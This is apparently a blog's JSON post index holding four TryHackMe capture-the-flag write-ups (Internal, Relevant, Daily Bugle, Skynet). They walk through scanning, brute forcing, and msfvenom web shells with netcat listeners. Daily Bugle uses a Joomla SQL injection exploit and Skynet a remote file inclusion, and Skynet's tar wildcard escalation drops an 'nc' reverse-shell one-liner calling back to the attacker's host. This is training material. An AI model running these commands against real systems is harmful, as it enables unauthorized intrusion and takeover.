[
  
  {
    "title": "TryHackMe Internal",
    "url": "/posts/internal/",
    "categories": "CTFs",
    "tags": "tryhackme",
    "date": "2025-01-08 00:00:00 -0500",
    





    
    "snippet": "Information GatheringWe are briefed:  You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks.  Scope of Work  T...",
    "content": "Information GatheringWe are briefed:  You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks.  Scope of Work  The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:  User.txtRoot.txtAdditionally, the client has provided the following scope allowances:  Ensure that you modify your hosts file to reflect internal.thmAny tools or techniques are permitted in this engagementLocate and note all vulnerabilities foundSubmit the flags discovered to the dashboardOnly the IP address assigned to your machine is in scope(Roleplay off)  I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.  Note - this room can be completed without Metasploit  Writeups will not be accepted for this room.The target IP address is 10.10.179.181.Our objectives are to:  locate and obtain the User.txt file,  locate and obtain the Root.txt file,  document all vulnerabilities found, and  provide remediation suggestions.EnumerationWe begin with the nmap scan nmap -T5 -A -O 10.10.179.181, which revealsStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-08 08:15 ESTNmap scan report for 10.10.179.181Host is up (0.10s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.29 (Ubuntu)Device type: general purposeRunning: Linux 4.XOS CPE: cpe:/o:linux:linux_kernel:4.15OS details: Linux 4.15Network Distance: 4 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 5900/tcp)HOP RTT       ADDRESS1   32.75 ms  10.6.0.12   ... 34   102.60 ms 10.10.179.181OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 16.31 secondsImmediately, we notice the default page for an Apache web server.We then fuzz for directories using the command ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.179.181/FUZZ -ic. This outputs...wordpress               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 97ms]blog                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 4360ms]                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 4383ms]javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 97ms]phpmyadmin              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 96ms]                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 97ms]server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 97ms...We notice that some of the functionality use by the web application uses the domain name internal.thm to refer to the target,so we add the entry 10.10.179.181 internal.thm to our /etc/hosts file.Our initial observation is thatthe wordpress login provides different output when a failed authentication attempt is made with a valid username than it doeswhen an invalid username is used, simplifying authentication bypass. Moreover, the phpmyadmin portal is accessible to the outside world. This is completely unnecessary and poses significant security risks.Upon navigating to the endpoint http://internal.thm/wordpress/ and clicking on the Entries Feed tab, we automaticallydownload a file named n-T86yJG containing XML data to be used by RSS readers.This file contains the line&lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;, which indicates that the web server is using wordpress version5.4.2. This is an information disclosure vulnerability, but it may be necessary for RSS to function properly in this case.We also note that users can post comments anonymously, which makes this page vulnerable to injection attacks such as XSS.ExploitationWe opt to perform a brute force attack on the wordpress login form with the commandhydra 10.10.179.181 -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \"/blog/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&amp;testcookie=1:F=Lost your password?\"We quickly find the password is my2boys and login. Afterward, we generate a php reverse shell using the commandmsfvenom -p php/reverse_php LHOST=10.6.4.176 LPORT=6969 -o shell.php, navigate to the theme editor, and copy the contentsof shell.php into the active theme’s index.php file.Then, we set up a netcat listener with nc -lvnp 6969 and navigate to http://internal.thm/blog/. Consequently, we receive a shell as www-data.Post-ExploitationTo identify the local users on the system we exectute cat /etc/passwd and receiveroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinlxd:x:105:65534::/var/lib/lxd/:/bin/falseuuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologinpollinate:x:109:1::/var/cache/pollinate:/bin/falsesshd:x:110:65534::/run/sshd:/usr/sbin/nologinaubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bashmysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/falseIn attempt to locate the user flag, we run find / -type f -iname 'user.txt' 2&gt;/dev/null, but find the file /usr/share/doc/phpmyadmin/html/_sources/user.txt, which is not a flag. Likely, we need a user with different read permissionsthan www-data.While performing some manual enumeration, we list the contents of the /opt directory and find the file wp-save.txt. Thecontents of this file are as follows:Bill,Aubreanna needed these credentials for something later.  Let her know you have them and where they are.aubreanna:&lt;DOITURSELF:)&gt;With ssh aubreanna@10.10.179.181, we are able to successfully authenticate with the aforementioned password. This allowsus to capture the user flag:Running find / -type f -iname 'root.txt' 2&gt;/dev/null gives us no results, so we will have to elevate privileges even further to obtain the root flag.Running linpeas on the machine indicates that it is vulnerable to CVE-2021-4034. We use the exploit at https://github.com/ly4k/PwnKitand gain root. As root, we rerun the previous find command and locate the root flag /home/root/root.txt."
  },
  
  {
    "title": "TryHackMe Relevant",
    "url": "/posts/relevant/",
    "categories": "CTFs",
    "tags": "tryhackme",
    "date": "2025-01-07 00:00:00 -0500",
    





    
    "snippet": "Information GatheringWe are given the following  You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days.  Scope ...",
    "content": "Information GatheringWe are given the following  You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days.  Scope of Work  The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:  User.txtRoot.txtAdditionally, the client has provided the following scope allowances:  Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation firstLocate and note all vulnerabilities foundSubmit the flags discovered to the dashboardOnly the IP address assigned to your machine is in scopeFind and report ALL vulnerabilities (yes, there is more than one path to root)(Roleplay off)  I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.Note - Nothing in this room requires Metasploit  Machine may take up to 5 minutes for all services to start.  Writeups will not be accepted for this room.The target IP is 10.10.154.250.Our objectives are to  Locate and secure the User.txt file,  Locate and secure the Root.txt file, and  Find and report all vulnerabilities on the target host.EnumerationWe begin with the nmap scan nmap -T5 -PS -sT -sV -sC -O 10.10.154.250 and receive the following output:Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-07 10:09 ESTNmap scan report for 10.10.154.250Host is up (0.10s latency).Not shown: 995 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION80/tcp   open  http          Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server| http-methods:|_  Potentially risky methods: TRACE135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds3389/tcp open  ms-wbt-server Microsoft Terminal Services|_ssl-date: 2025-01-07T15:10:05+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=Relevant| Not valid before: 2025-01-06T15:02:43|_Not valid after:  2025-07-08T15:02:43| rdp-ntlm-info:|   Target_Name: RELEVANT|   NetBIOS_Domain_Name: RELEVANT|   NetBIOS_Computer_Name: RELEVANT|   DNS_Domain_Name: Relevant|   DNS_Computer_Name: Relevant|   Product_Version: 10.0.14393|_  System_Time: 2025-01-07T15:09:25+00:00Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)No exact OS matches for host (test conditions non-ideal).Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:| smb-os-discovery:|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)|   Computer name: Relevant|   NetBIOS computer name: RELEVANT\\x00|   Workgroup: WORKGROUP\\x00|_  System time: 2025-01-07T07:09:30-08:00| smb2-security-mode:|   3:1:1:|_    Message signing enabled but not required| smb-security-mode:|   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-time:|   date: 2025-01-07T15:09:26|_  start_date: 2025-01-07T15:03:00|_clock-skew: mean: 1h36m00s, deviation: 3h34m42s, median: 0sOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 62.39 secondsThe target appears to be a typical windows server hosting a webs server on port 80/TCP and SMB on the typical ports, 139/TCPand 445/TCP. It appears that on port 3389/TCP, an RDP instance is running.A more thorough scan, of all the TCP ports, reveals the following additional services:49663/tcp open  http          Microsoft IIS httpd 10.0| http-methods:|_  Potentially risky methods: TRACE|_http-title: IIS Windows Server|_http-server-header: Microsoft-IIS/10.049667/tcp open  msrpc         Microsoft Windows RPC49669/tcp open  msrpc         Microsoft Windows RPCFor good measure, we enumerate the SMB shares with nmap --script samba-enum-shares.nse -p 445 10.10.154.250:Host script results:| smb-enum-shares:|   account_used: guest|   \\\\10.10.154.250\\ADMIN$:|     Type: STYPE_DISKTREE_HIDDEN|     Comment: Remote Admin|     Anonymous access: &lt;none&gt;|     Current user access: &lt;none&gt;|   \\\\10.10.154.250\\C$:|     Type: STYPE_DISKTREE_HIDDEN|     Comment: Default share|     Anonymous access: &lt;none&gt;|     Current user access: &lt;none&gt;|   \\\\10.10.154.250\\IPC$:|     Type: STYPE_IPC_HIDDEN|     Comment: Remote IPC|     Anonymous access: &lt;none&gt;|     Current user access: READ/WRITE|   \\\\10.10.154.250\\nt4wrksv:|     Type: STYPE_DISKTREE|     Comment:|     Anonymous access: &lt;none&gt;|_    Current user access: READ/WRITEVulnerability:We successfully authenticate to the \\\\10.10.154.250\\nt4wrksv share anonymously and locate a file named passwords.txt.This file contains[User Passwords - Encoded]Qm9iIC0gIVBAJCRXMHJEITEyMw==QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQkPresumably, the file contains a pair of base64-encoded passwords. We decode them using echo '&lt;LINE&gt;' | base64 -d for each lineLINE. This uncovers the followingBob - !P@$$W0rD!123Bill - Juw4nnaM4n420696969!$$$Perhaps, we can use these credentials to authenticate to an RDP session. We would need to identify some usernames, however.Attempting to sign in through RDP using xfreerdp /v:10.10.154.250 /u:&lt;USER&gt; /p:&lt;PASS&gt; for each combination of the stringsBob, Bill, !P@$$W0rD!123, and Juw4nnaM4n420696969!$$$ fails. This suggests that we should pursue another attack vector.Next, we fuzz for directories on the http server on port 80/TCP using ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.154.250 -ic, but we find nothing.Instead, we fuzz for directories on the alternate web server on port TCP/49663 with ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.112.186:49663/FUZZ -ic.We find the endpoint http://10.10.112.186:49663/nt4wrksv, which matches the name of the SMB share to which we previously authenticated.ExploitationUpon visiting http://10.10.112.186:49663/passwords.txt, we find the same file we found in the SMB share. This indicates thatthe server is hosting files from the share.We generate an aspx reverse shell with msfvenom -p windows/shell/reverse_tcp -f aspx -o shell.aspx LHOST=10.6.4.176.We then upload the shell to the share with  the commandssmbclient //10.10.112.186/nt4wrksv and put shell.aspx shell.aspx. Afterward,we set up a netcat listener with nc -lvnp 4444.Upon navigating to http://10.10.112.186:49633/shell.aspx, we receive a shell as iis apppool\\defaultapppool.As we are searching for the User.txt file we run the command where /R c:\\ User.txt to locate it. This reveals that itis found at c:\\Users\\Bob\\Desktop\\User.txt.We then navigate to the directory and obtain the user flag:Post-ExploitationRunning, whoami /all reveals that we possess the SeImpersonate privilege. To exploit this we, use PrintSpoofer.exe (Thesource code may be located at https://github.com/itm4n/PrintSpoofer). Wesimply upload the executable using smbclient and run it.This gives us a root shell, so we use where /R c:\\ Root.txt to locate the root flag. This tells us that the flag is located at c:\\Users\\Administrator\\Desktop. We navigate to this directory and capture the flag:"
  },
  
  {
    "title": "TryHackMe Daily Bugle",
    "url": "/posts/daily_bugle/",
    "categories": "CTFs",
    "tags": "tryhackme",
    "date": "2025-01-03 00:00:00 -0500",
    





    
    "snippet": "Information GatheringWe are instructed as follows:  Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.And we are given the t...",
    "content": "Information GatheringWe are instructed as follows:  Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.And we are given the target IP address 10.10.89.186.Our objectives are to  determine who robbed the bank,  identify the version of Joomla running on the web server,  obtain the user flag, and  obtain the root flag.EnumerationWe begin with an nmap scan nmap -sS -T5 -sC -sV 10.10.89.186, revealingPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40| http-robots.txt: 15 disallowed entries| /joomla/administrator/ /administrator/ /bin/ /cache/| /cli/ /components/ /includes/ /installation/ /language/|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/|_http-generator: Joomla! - Open Source Content Management|_http-title: Home3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)Upon navigating to the web server on port 80/TCP, the front-page article discloses that it was “Spider-Man” whorobbed the bank.Fuzzing for directories withffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.121.232/FUZZ -icyieldsimages                  [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 118ms]                        [Status: 200, Size: 9259, Words: 441, Lines: 243, Duration: 223ms]media                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 102ms]templates               [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 102ms]modules                 [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 98ms]bin                     [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 99ms]plugins                 [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 97ms]includes                [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 99ms]language                [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 98ms]components              [Status: 301, Size: 240, Words: 14, Lines: 8, Duration: 100ms]cache                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 100ms]libraries               [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 98ms]tmp                     [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 99ms]layouts                 [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 102ms]administrator           [Status: 301, Size: 243, Words: 14, Lines: 8, Duration: 95ms]cli                     [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 104ms]                        [Status: 200, Size: 9259, Words: 441, Lines: 243, Duration: 218ms]To determine the Joomla version, we happen upon the web page https://docs.joomla.org/How_to_check_the_Joomla_version%3F, which suggests that we visit the URL http://10.10.89.186/languages/en-GB/en-GB.xml. However, this endpoint does not exist; instead, we visithttp://10.10.89.186/language/en-GB/en-GB.xml, upon which we find&lt;metafile version=\"3.7\" client=\"site\"&gt;&lt;name&gt;English (en-GB)&lt;/name&gt;&lt;version&gt;3.7.0&lt;/version&gt;...Hence, we conclude that the web server is running Joomla version 3.7.0.ExploitationWe find CVE-2017-8917 after some research. We also find a python implementation at https://github.com/XiphosResearch/exploits/tree/master/Joomblah.Next, we clone the repository withgit clone https://github.com/XiphosResearch/exploits/tree/master. Runningthe exploit with python3 joomblah.py http://10.10.89.186/ outputs[$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com','$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']To crack the hash, we create a file hash.txt and copy into it the hash $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm. We then go to the web page https://hashes.com/en/tools/hash_identifier and use the providedtool to discover that the hash type isbcrypt $2*$, Blowfish (Unix). By running hashcat --help, we find thatthe hash mode for this hash is 3200. Then, we pass the file, along with the rockyou.txt wordlist, to hashcatto perform a dictionary attack with the commandhashcat -D 2 -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txtThis quickly reveals Jonah’s cracked password.With this password, we sign in to the Joomla administrative panel at http://10.10.89.186/administrator asthe user jonah, and we generate a php web shell usingmsfvenom -p php/reverse_php -o shell.php LHOST=10.6.4.176.To upload the file, we navigate to the Templates tab and modify the Protostartemplate by copying into index.php the contents from our shell, shell.php.Afterward, we set up a netcat listener with ncat -lvnp 4444 and navigate to http://10.10.89.186/index.php.This gives us a shell as apache.Post-ExploitationBy executing ls -al /home, we notice that the only user with a home directory is jjameson, and that, unfortunately,we do not have read access to /home/jjameson. Nevertheless, we find a file named configuration.php in the web root directory /var/www/html, which contains the linepublic $password = 'DOITURSELF:)';. This password allows us to sign in as jjameson with ssh jjameson@10.10.89.186. We are then able to capture the user flag:Running sudo -l, we notice that we have sudo permissions for yum and use the the method demonstrated in part (b) of the article at https://gtfobins.github.io/gtfobins/yum/ to obtain a root shell. With this shell, we capture the root flag:"
  },
  
  {
    "title": "TryHackMe Skynet",
    "url": "/posts/skynet/",
    "categories": "CTFs",
    "tags": "tryhackme",
    "date": "2024-12-30 00:00:00 -0500",
    





    
    "snippet": "Information GatheringWe are given:  Deploy and compromise the vulnerable machine!Additonally, we are given the target IP 10.10.13.83. Our objectives are as follows:  Obtain Miles’ email password,  ...",
    "content": "Information GatheringWe are given:  Deploy and compromise the vulnerable machine!Additonally, we are given the target IP 10.10.13.83. Our objectives are as follows:  Obtain Miles’ email password,  Identify the hidden directory,  Recall the type of vulnerability wherein one includes a remote file for malicious purposes,  Obtain the user flag, and  Obtain the root flag.EnumerationWe run an nmap scan with nmap -sS -T5 -sC -sV 10.10.13.83 and obtain the followingNmap scan report for 10.10.13.83Host is up (0.097s latency).Not shown: 988 closed tcp ports (reset)PORT      STATE    SERVICE      VERSION22/tcp    open     ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)80/tcp    open     http         Apache httpd 2.4.18 ((Ubuntu))|_http-title: Skynet|_http-server-header: Apache/2.4.18 (Ubuntu)110/tcp   open     pop3         Dovecot pop3d|_pop3-capabilities: CAPA PIPELINING UIDL AUTH-RESP-CODE SASL RESP-CODES TOP139/tcp   open     netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp   open     imap         Dovecot imapd|_imap-capabilities: IMAP4rev1 more SASL-IR post-login have IDLE capabilities listed LITERAL+ Pre-login OK LOGINDISABLEDA0001 ENABLE ID LOGIN-REFERRALS445/tcp   open     netbios-ssn  Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)646/tcp   filtered ldp1023/tcp  filtered netvenuechat1042/tcp  filtered afrog3580/tcp  filtered nati-svrloc3905/tcp  filtered mupdate24444/tcp filtered unknownService Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb2-security-mode:|   3:1:1:|_    Message signing enabled but not required|_clock-skew: mean: 1h59m54s, deviation: 3h27m50s, median: -5s| smb-security-mode:|   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-time:|   date: 2024-12-30T17:58:47|_  start_date: N/A|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery:|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: skynet|   NetBIOS computer name: SKYNET\\x00|   Domain name: \\x00|   FQDN: skynet|_  System time: 2024-12-30T11:58:47-06:00Nmap done: 1 IP address (1 host up) scanned in 24.43 secondsWe notice SAMBA running on port 445/TCP and enumerate it using nmap --script samba-enum-shares.nse -p 445 10.10.13.83.This revealsHost script results:| smb-enum-shares:|   account_used: guest|   \\\\10.10.13.83\\IPC$:|     Type: STYPE_IPC_HIDDEN|     Comment: IPC Service (skynet server (Samba, Ubuntu))|     Users: 1|     Max Users: &lt;unlimited&gt;|     Path: C:\\tmp|     Anonymous access: READ/WRITE|     Current user access: READ/WRITE|   \\\\10.10.13.83\\anonymous:|     Type: STYPE_DISKTREE|     Comment: Skynet Anonymous Share|     Users: 0|     Max Users: &lt;unlimited&gt;|     Path: C:\\srv\\samba|     Anonymous access: READ/WRITE|     Current user access: READ/WRITE|   \\\\10.10.13.83\\milesdyson:|     Type: STYPE_DISKTREE|     Comment: Miles Dyson Personal Share|     Users: 0|     Max Users: &lt;unlimited&gt;|     Path: C:\\home\\milesdyson\\share|     Anonymous access: &lt;none&gt;|     Current user access: &lt;none&gt;|   \\\\10.10.13.83\\print$:|     Type: STYPE_DISKTREE|     Comment: Printer Drivers|     Users: 0|     Max Users: &lt;unlimited&gt;|     Path: C:\\var\\lib\\samba\\printers|     Anonymous access: &lt;none&gt;|_    Current user access: &lt;none&gt;We notice that we have read and write access on \\\\10.10.13.83\\anonymous. Moreover, it appears that Miles’ personal files are accessible at \\\\10.10.13.83\\milesdyson. However, this share is inaccessible without credentials.On the anonymous share, we find a file attention.txt containingA recent system malfunction has caused various passwords to be changed. All skynetemployees are required to change their password after seeing this.-Miles DysonAdditionally, we obtain some log files, which appear to be the history of the password resets mentioned in attention.txt.Afterward, we move on to the web server at port 80/TCP and fuzz for directories usingffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.13.83/FUZZ -icThis reveals the directory /squirrelmail, allowing us to login into Miles’ email account. The combinationMilesDyson:&lt;MOSTRECENTPASSFROMLOGS&gt; works.In Miles’ inbox, we find the following messageThis password allows us to authenticate to Miles’ SMB share, where we find the file notes/important.txt. Thefile reads1. Add features to beta CMS /45kra24zxs28v3yd2. Work on T-800 Model 101 blueprints3. Spend more time with my wifeThis suggests that there is a directory named /45kra24zxs28v3yd. Navigating to http://10.10.13.83/45kra24zxs28v3yd/ reveals Miles’ personal page. The notes/important.txt file suggests that there is a login page available, sowe fuzz usingffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.13.83/45kra24zxs28v3yd/FUZZ -icConsequently, we find a login form at /45kra24zxs28v3yd/administrator/.ExploitationAfter some research, we identify an exploit compatible with this CMS at https://www.exploit-db.com/exploits/25971.To use this exploit, we first generate a php reverse shell with the command msfvenom -p php/reverse_php LHOST=10.6.4.176 -o shell.php. Then, we serve this file using python3 -m http.server and start a netcat listener withncat -lvnp 4444. Finally, we visit the URLhttp://10.10.13.83/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.6.4.176:8000/shell.phpand receive a shell as www-data. We then obtain the user flag:Post-ExploitationChecking for cron jobs, we execute the command cat /etc/crontab, which returns# /etc/crontab: system-wide crontab# Unlike any other crontab you don't have to run the `crontab'# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user\tcommand*/1 *\t* * *   root\t/home/milesdyson/backups/backup.sh...The first job seems atypical. At /home/milesdyson/backups/backups.sh, we find#!/bin/bashcd /var/www/htmltar cf /home/milesdyson/backups/backup.tgz *We use wildcard injection to exploit this cron job: first, we cd /var/www/html. Then, we run echo \"\" &gt; '--checkpoint=1andecho \"\" &gt; '--checkpoint-action=exec=bash evil.sh'Lastly, we write a reverse shell evil.sh usingecho \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.6.4.176 1234 &gt; /tmp/f\" &gt; evil.shAfter setting up a netcat listener with the command ncat -lvnp 1234,we receive a shell as root.We then obtain the root flag:"
  }
  
]

